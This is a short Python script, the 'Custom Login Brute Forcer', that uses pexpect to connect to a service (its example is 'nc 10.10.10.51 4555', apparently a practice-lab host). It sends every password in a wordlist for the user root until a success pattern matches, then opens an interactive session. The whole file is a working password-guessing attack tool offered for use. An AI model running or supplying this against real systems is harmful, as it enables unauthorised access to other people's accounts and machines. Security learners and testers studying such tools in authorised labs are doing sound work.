import pexpect
import sys
import pty

print("\n--------------------------------------Custom Login Brute Forcer---------------------------------------\n\n")
print("***********************version 1.0***********************")
print("# By default this script will brute force the username: root")
print("# To change this behavior, edit the script\n")
wordlist = input("Enter the path to your worldlist file \n")
print()

f = open(wordlist, 'r')

print("Enter a command to connect to protocol for bruteforce attack:")
command = input("ex: nc 10.10.10.51 4555\n")
print()
print("Enter login prompt regex:")
regex_prompt1 = input("ex: .*Login id:\n")
print()
print("Enter password prompt regex:")
regex_prompt2 = input("ex: Password:\n")
print()
print("Enter fail condition regex:")
regex_fail = input("ex: Login failed for.*\n")
print()
print("Enter pass condition regex:")
regex_pass = input("ex: Welcome.*\n")
print()

child = pexpect.spawn(command)
child.expect(regex_prompt1)

for line in f:
    child.sendline('root')
    #print(child.after)
    child.expect(regex_prompt2)
    child.send(line)
    #print(child.before)
    #print(child.after)
    print("Trying username:root AND password:" + line)
    response = child.expect ([regex_pass, regex_fail])
    if response==1:
        #print(child.before)
        child.expect(regex_prompt1)
    elif response==0:
        #print(child.before)
        print("Login successful!\n")
        child.interact()
    else:
        print("GOT HERE")
f.close()
